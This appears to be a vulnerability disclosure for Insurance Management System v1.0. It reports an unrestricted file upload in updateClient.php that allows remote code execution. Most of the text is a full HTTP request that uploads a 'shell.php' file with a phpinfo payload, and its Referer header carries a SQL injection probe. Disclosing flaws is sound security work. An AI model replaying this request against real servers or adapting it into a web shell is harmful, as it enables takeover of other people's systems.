# Insurance Management System v1.0 by oretnom23 has arbitrary code execution (RCE)

vendor: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Vulnerability url: http://ip/insurance/editClient.php?client_id=1511986129;http://ip/insurance/updateClient.php

Vulnerability file:\ insurance\ updateClient.php

Loophole location： Arbitrary file upload vulnerability exists in Website Cover upload point in system info (RCE)

Request package for file upload：

```sql
POST /insurance/updateClient.php HTTP/1.1
Host: 192.168.1.19
Content-Length: 1460
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.19
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryueZa8WTcFxYpFdQj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.19/insurance/editClient.php?client_id=1511986129%27%20and%20length(database())%20=4%20--+
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=nur494rnipq7uvtdrinjesc2ja
Connection: close

------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="fileToUpload"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="client_id"

1511986129
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="client_password"

123
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="name"

Aemon Task
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="sex"

Male
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="birth_date"

10-09-1970
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="marital_status"

Married
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="nid"

46814518451
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="phone"

54189465100
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="address"

Dhaka
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="policy_id"

1
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="agent_id"

555
------WebKitFormBoundaryueZa8WTcFxYpFdQj
Content-Disposition: form-data; name="submit"

UPDATE
------WebKitFormBoundaryueZa8WTcFxYpFdQj--
```

The files will be uploaded to this directory \insurance\uploads\


We visited the directory of the file in the browser and found that the code had been executed

